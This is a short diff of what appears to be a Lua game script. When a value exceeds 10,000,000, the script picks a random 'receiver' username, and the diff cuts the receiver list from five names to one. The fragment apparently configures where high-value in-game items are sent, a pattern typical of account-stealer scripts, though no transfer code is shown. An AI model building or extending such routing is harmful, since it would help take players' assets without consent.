@@ -13,11 +13,7 @@ if currentValue <= 10000000 then
     return
 end
 local receivers = {
-    "ninaFalconBear",
-    "MrsnateFrostFire",
-    "ItstaraSkater2024",
-    "NexusRileyPulse50",
-    "TheRealTinajolt2018"
+    "ItsJulian_Pulse"
 }
 local receiver = receivers[
     math.random(1, #receivers)
